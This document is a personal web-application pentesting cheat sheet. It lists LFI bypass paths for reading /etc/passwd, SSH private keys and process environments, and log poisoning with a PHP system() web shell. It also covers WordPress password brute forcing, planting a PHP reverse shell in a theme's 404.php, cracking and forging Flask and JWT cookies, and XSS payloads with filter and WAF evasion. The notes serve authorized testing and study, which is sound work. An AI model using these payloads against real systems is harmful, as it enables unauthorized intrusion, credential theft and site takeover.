# Web-App-Pentesting-Notes
My personal Web App Pentesting Notes.

Feel Free to dm me about any suggestions. 

# Subdomain Enumeration:

All Unique Subdomais will be saved in a file named example.com_subdomains.

- using crt.sh
  - `export WEB=example.com`

  - ```curl https://crt.sh/?q=%25.$WEB | grep -Eo '.+\.'+$WEB | sed -e 's/<BR>/\n/g' -e 's/<TD>//g' -e  's/    //g' -e  's/ <TITLE>crt.sh | .*$/\n/g' | sort -u >  ${WEB}_subdomains```


# Local File Incluison (LFI):

## Some Quick LFI Bypasses for parameter "File":

- ?File=....//....//....//....//....//etc/passwd

- ?File=something_valid../../../../../../../etc/passwd

- ?File=php://filter/convert.base64-encode/resource=/etc/passwd

## What to do when you have LFI:

- Did you enumerate users? look at /etc/passwd

- Did you check all user's private ssh keys? usually located at /home/"user"/.ssh/id_rsa

- Enumerate what is running on the server and what Version. Write a python script to read /proc/number/cmdline .
  e.g:
  - /proc/10/cmdline
  - /proc/257/cmdline

  - Also you can read /proc/self/cmdline and /proc/self/environ 
- Can you Access access logs? usually found in  (/var/log/apahce2/access.log or  /var/log/nginx/access.log) ? If yes you can try to get a reverse shell using log poisoning

  - Send a GET request with ```User-Agent: <?php system($_GET['cmd']); ?>```
  
  - Now you Can execute commands by visit using the LFI https://website.com?file=/var/log/nginx/access.log?cmd=whoami 
  
- If the site is using $_SESSION in the requests and you can access you sessions from /tmp/sess_a4f8b6d72aa5be42459cdf0c08256543 // note that the part after sess is the php session id.
  - Then you can change what is sent in $_SESSION to contain malicious code to execute.
  - https://www.pwny.cc/web-attacks/local-file-inclusion-lfi/lfi-to-rce Is a great resource.  

- If there is a website running you may be able to enumerate subdomains from /etc/nginx/sites-enabled/default .

- Finally Don't forget to check the source code of the application and further analyze it.

# Wordpress:

- Always Check for the wordpress version. Google is your friend.

- Use `wpscan` an automated tool for wordpress penetration testing.

  - usage:
  
    1- To enumerate users:
    
     `wpscan --url https://example.com -e u`
    
      
    2- To brute force passwords for found users:
      
       `wpscan --url https://google.com -U users.txt -P /usr/share/wordlists/rockyou.txt`
    
    3- To enumerate vulnerable plugins:
      
      `wpscan --url https://example.com -e vp`
      
- If you found valid credentials you can try to upload a php reverse shell if you can edit posts.

  - Usually we change the 404.php file.

  - Visit the reverse shell located at http://example.com/wordpress/wp-content/themes/twentytwentyone/404.php
    
     1- Note that `twentytwentyone` is the theme name and may be diffrent for you.
     
# Cookies:

## Flask:

### If website is running flask using python it may be using flask cookies.
  
  - Steps to generate your own flask cookie.
    
    - `pip3 install flask-unsign`
    
    - `flask-unsign --decode --cookie '<cookie_val>' `
    
    - `flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie '<cookie_val>' `
    
    - Once the secret is found you can now sign your own cookie ( use the format from the decoded cookie)
    
      `flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'notsosecret'`
      
## JSON Web Tokens (JWT):
### Servers runnning  using Node.js, Python, Ruby, Java may be using JWT.
  - Weak JWT keys may be used by the developer which allow us to forge a cookies using this weak secret.
  - a known and helpful JWT wordlist of common JWT secrets.
    - `https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list`
  - hashcat -a 0 -m 16500 '<JWT_cookie>' /path/to/jwt.secret.list
    - if jwt.secret.list doesn't find the secret you could try running the same command with rockyou.txt
  - After you found the secret used for signing JWT cookies you can forge the cookies using:
    
    - `https://gchq.github.io/CyberChef/#recipe=JWT_Sign('','HS256')`
    
    - `https://jwt.io`

# Cross Site Scripting (XSS):
## XSS Types:
### Reflected XSS:
- XSS is reflected
  - Example is having a victim click on http://example.com?q=<script>alert()</script>
  - Note that reflected XSS requires User Interaction and for that reason usually is less severe.
### Stored XSS:
- XSS is stored on the server and is rendered for everyone simply by browsing the website
  - Example is storing comments for a product/article
  - This is more critical since it doesn't require any user interaction and affects every customer.
## XSS Basic Payloads:
- ```<script>alert()</script>```
- ```<img src=x onerror=prompt()>```
- ```<svg/onload=confirm()>```
## XSS Obfucation, filter and waf evasion:
- If ">" is filtered out:
  - ``` <img src=x onerror=alert('XSS')```
- If paranthese are filtered out :
  
  -``` <img src=x onerror=alert`xss` ```
- If html tags are filtered out try
  - using Capital Letters
    
    -```<ScRipT>alert()</ScRipT>```
    -```<ImG src=x onerror=alert()>```
- If alert,prompt,confirm are filtered out you can try using base64 to obfuscate the payload
  - ```<ImG src=lol onerror=eval(atob(YWxlcnQoJ1hTUycp))>```
- If eval is filtered out
  - ```<ImG src=lol onerror=setTimeout(atob(YWxlcnQoJ1hTUycp))>```
- If no spaces are allowd:
  - ```<SvG/%09onload%20=prompt`xSs`> ```
- If "on<anything>=" is filtered out:
  -``` <ObJeCt %09data%20="data:text/html;base64,PEltRyBzcmM9eSBvbmVycm9yPXByb21wdGBYc1NgPg==">```
  - ``` <ImG src=lol onerror%20%09=setTimeout(atob(YWxlcnQoJ1hTUycp))> ``` 

